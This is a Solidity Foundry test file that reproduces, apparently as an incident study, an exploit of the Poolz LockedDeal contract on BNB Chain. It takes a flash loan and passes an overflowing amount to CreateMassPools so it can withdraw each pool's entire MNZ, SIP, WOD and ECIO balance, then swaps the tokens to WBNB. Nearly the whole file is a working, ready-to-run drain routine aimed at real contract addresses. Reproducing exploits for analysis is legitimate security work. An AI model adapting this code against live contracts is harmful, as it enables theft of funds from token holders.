// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

contract ContractTest is Test {
    IDPPAdvanced constant dppAdvanced = IDPPAdvanced(0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476);
    WBNB constant wbnb = WBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);

    IERC20 constant mnz = IERC20(0x861f1E1397daD68289e8f6a09a2ebb567f1B895C);

    IERC20 constant wod = IERC20(0x298632D8EA20d321fAB1C9B473df5dBDA249B2b6);

    IERC20 constant sip = IERC20(0x9e5965d28E8D44CAE8F9b809396E0931F9Df71CA);

    IERC20 constant ecio = IERC20(0x327A3e880bF2674Ee40b6f872be2050Ed406b021);

    IERC20 constant busd = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);

    IPancakeRouter constant pancakeRouter = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));

    LockedDeal constant poolzpool = LockedDeal(payable(0x8BfAA473a899439d8E07BF86a8C6cE5De42fE54B));

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 26_475_403);
    }

    function testExploit() external {
        bytes memory data;
        address assetTo = address(this);
        data = "poolz";
        dppAdvanced.flashLoan(1e18, 0, assetTo, data);
    }

    function DPPFlashLoanCall(address, uint256, uint256, bytes memory data) external {
        if (keccak256(data) == keccak256("poolz")) {
            console.log("Flashloan attacks");
            emit log_named_decimal_uint("[Before mnz Exp] wbnb  balance", wbnb.balanceOf(address(this)), 18);

            address[] memory swapPath = new address[](3);

            wbnb.withdraw(1e18);

            swapPath[0] = address(wbnb);
            swapPath[1] = address(busd);
            swapPath[2] = address(mnz);

            pancakeRouter.swapExactETHForTokens{value: 1 ether}(1, swapPath, address(this), block.timestamp);

            mnz.approve(address(poolzpool), type(uint256).max);
            sip.approve(address(poolzpool), type(uint256).max);
            ecio.approve(address(poolzpool), type(uint256).max);
            wod.approve(address(poolzpool), type(uint256).max);

            mnz.approve(address(pancakeRouter), type(uint256).max);
            sip.approve(address(pancakeRouter), type(uint256).max);
            ecio.approve(address(pancakeRouter), type(uint256).max);
            wod.approve(address(pancakeRouter), type(uint256).max);

            uint256 mnz_balance = mnz.balanceOf(address(poolzpool));
            uint256 overflow_data;

            overflow_data = type(uint256).max - mnz_balance + 2;

            uint64[] memory begintime = new uint64[](2);
            begintime[0] = uint64(block.timestamp);
            begintime[1] = uint64(block.timestamp);

            uint256[] memory transfer_data = new uint256[](2);
            transfer_data[0] = overflow_data;
            transfer_data[1] = mnz_balance;

            address[] memory owner_addr = new address[](2);
            owner_addr[0] = address(this);
            owner_addr[1] = address(this);

            uint256 firstPoolId;
            uint256 lastPoolId;

            (firstPoolId, lastPoolId) = poolzpool.CreateMassPools(address(mnz), begintime, transfer_data, owner_addr);

            poolzpool.WithdrawToken(lastPoolId);

            uint256 mnz_number = mnz.balanceOf(address(this));

            emit log_named_decimal_uint("[mnz Exp] mnz pool balance", mnz_number, 18);

            sellmnz();

            emit log_named_decimal_uint("[After mnz Exp] wbnb  balance", wbnb.balanceOf(address(this)), 18);

            wbnb.withdraw(1e18);

            emit log_named_decimal_uint("[Before sip Exp] wbnb  balance", wbnb.balanceOf(address(this)), 18);

            swapPath[0] = address(wbnb);
            swapPath[1] = address(busd);
            swapPath[2] = address(sip);

            pancakeRouter.swapExactETHForTokens{value: 1 ether}(1, swapPath, address(this), block.timestamp);

            uint256 sip_balance = sip.balanceOf(address(poolzpool));
            emit log_named_decimal_uint("[sip Exp] pool sip  balance", sip.balanceOf(address(poolzpool)), 18);

            overflow_data = type(uint256).max - sip_balance + 2;

            transfer_data[0] = overflow_data;
            transfer_data[1] = sip_balance;

            (firstPoolId, lastPoolId) = poolzpool.CreateMassPools(address(sip), begintime, transfer_data, owner_addr);

            poolzpool.WithdrawToken(lastPoolId);

            sellsip();

            emit log_named_decimal_uint("[After sip Exp] pool sip  balance", sip.balanceOf(address(poolzpool)), 18);

            emit log_named_decimal_uint("[After sip Exp] user wbnb  balance", wbnb.balanceOf(address(this)), 18);

            wbnb.withdraw(1e18);

            emit log_named_decimal_uint("[Before wod Exp] wbnb  balance", wbnb.balanceOf(address(this)), 18);

            address[] memory simplepath = new address[](2);

            simplepath[0] = address(wbnb);
            simplepath[1] = address(wod);

            pancakeRouter.swapExactETHForTokens{value: 1 ether}(1, simplepath, address(this), block.timestamp);

            uint256 wod_balance = wod.balanceOf(address(poolzpool));
            emit log_named_decimal_uint("[wod Exp] pool wod  balance", wod.balanceOf(address(poolzpool)), 18);

            overflow_data = type(uint256).max - wod_balance + 2;

            transfer_data[0] = overflow_data;
            transfer_data[1] = wod_balance;

            (firstPoolId, lastPoolId) = poolzpool.CreateMassPools(address(wod), begintime, transfer_data, owner_addr);

            poolzpool.WithdrawToken(lastPoolId);

            sellwod();

            emit log_named_decimal_uint("[After wod Exp] pool wod  balance", wod.balanceOf(address(poolzpool)), 18);

            emit log_named_decimal_uint("[After wod Exp] wbnb  balance", wbnb.balanceOf(address(this)), 18);

            wbnb.withdraw(1e18);

            emit log_named_decimal_uint("[Before ecio Exp] wbnb  balance", wbnb.balanceOf(address(this)), 18);

            swapPath[0] = address(wbnb);
            swapPath[1] = address(busd);
            swapPath[2] = address(ecio);

            pancakeRouter.swapExactETHForTokens{value: 1 ether}(1, swapPath, address(this), block.timestamp);

            uint256 ecio_balance = ecio.balanceOf(address(poolzpool));

            emit log_named_decimal_uint("[ecio Exp] pool ecio  balance", ecio.balanceOf(address(poolzpool)), 18);

            overflow_data = type(uint256).max - ecio_balance + 2;

            transfer_data[0] = overflow_data;
            transfer_data[1] = ecio_balance;

            (firstPoolId, lastPoolId) = poolzpool.CreateMassPools(address(ecio), begintime, transfer_data, owner_addr);

            poolzpool.WithdrawToken(lastPoolId);

            sellecio();

            emit log_named_decimal_uint("[After ecio Exp] pool ecio  balance", ecio.balanceOf(address(poolzpool)), 18);

            emit log_named_decimal_uint("[After ecio Exp] wbnb  balance", wbnb.balanceOf(address(this)), 18);

            emit log_named_decimal_uint(
                "[Total exploit wbnb balance ] wbnb  balance", wbnb.balanceOf(address(this)), 18
            );

            wbnb.transfer(address(dppAdvanced), 1 * 1e18);
        }
    }

    function sellecio() internal {
        address[] memory path = new address[](3);
        path[0] = address(ecio);
        path[1] = address(busd);
        path[2] = address(wbnb);
        pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            ecio.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }

    function sellwod() internal {
        address[] memory path = new address[](2);
        path[0] = address(wod);
        path[1] = address(wbnb);
        pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            wod.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }

    function sellsip() internal {
        address[] memory path = new address[](3);
        path[0] = address(sip);
        path[1] = address(busd);
        path[2] = address(wbnb);
        pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            sip.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }

    function sellmnz() internal {
        address[] memory path = new address[](3);
        path[0] = address(mnz);
        path[1] = address(busd);
        path[2] = address(wbnb);
        pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            mnz.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }

    receive() external payable {}
}

interface IDPPAdvanced {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes memory data) external;
}

interface LockedDeal {
    event NewPoolCreated(uint256 PoolId, address Token, uint64 FinishTime, uint256 StartAmount, address Owner);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event PoolApproval(uint256 PoolId, address Spender, uint256 Amount);
    event PoolOwnershipTransfered(uint256 PoolId, address NewOwner, address OldOwner);
    event TransferIn(uint256 Amount, address From, address Token);
    event TransferInETH(uint256 Amount, address From);
    event TransferOut(uint256 Amount, address To, address Token);
    event TransferOutETH(uint256 Amount, address To);

    function ApproveAllowance(uint256 _PoolId, uint256 _Amount, address _Spender) external;

    function CreateMassPools(
        address _Token,
        uint64[] memory _FinishTime,
        uint256[] memory _StartAmount,
        address[] memory _Owner
    ) external returns (uint256, uint256);

    function CreateNewPool(
        address _Token,
        uint64 _FinishTime,
        uint256 _StartAmount,
        address _Owner
    ) external returns (uint256);

    function CreatePoolsWrtTime(
        address _Token,
        uint64[] memory _FinishTime,
        uint256[] memory _StartAmount,
        address[] memory _Owner
    ) external returns (uint256, uint256);

    function GetFee() external view returns (uint16);

    function GetMinDuration() external view returns (uint16);

    function GetMyPoolsId() external view returns (uint256[] memory);

    function GetPoolAllowance(uint256 _PoolId, address _Address) external view returns (uint256);

    function GetPoolData(uint256 _id) external view returns (uint64, uint256, address, address);

    function GovernerContract() external view returns (address);

    function IsPayble() external view returns (bool);

    function PozFee() external view returns (uint256);

    function PozTimer() external view returns (uint256);

    function SetFee(uint16 _fee) external;

    function SetMinDuration(uint16 _minDuration) external;

    function SetPOZFee(uint16 _fee) external;

    function SetPozTimer(uint256 _pozTimer) external;

    function SplitPoolAmount(uint256 _PoolId, uint256 _NewAmount, address _NewOwner) external returns (uint256);

    function SplitPoolAmountFrom(uint256 _PoolId, uint256 _Amount, address _Address) external returns (uint256);

    function SwitchIsPayble() external;

    function TransferPoolOwnership(uint256 _PoolId, address _NewOwner) external;

    function WhiteListId() external view returns (uint256);

    function WhiteList_Address() external view returns (address);

    function WithdrawERC20Fee(address _Token, address _to) external;

    function WithdrawETHFee(address _to) external;

    function WithdrawToken(uint256 _PoolId) external returns (bool);

    function isTokenFilterOn() external view returns (bool);

    function isTokenWhiteListed(address _tokenAddress) external view returns (bool);

    function maxTransactionLimit() external view returns (uint256);

    function name() external view returns (string memory);

    function owner() external view returns (address);

    function renounceOwnership() external;

    function setGovernerContract(address _address) external;

    function setMaxTransactionLimit(uint256 _newLimit) external;

    function setWhiteListAddress(address _address) external;

    function setWhiteListId(uint256 _id) external;

    function swapTokenFilter() external;

    function transferOwnership(address newOwner) external;

    receive() external payable;
}
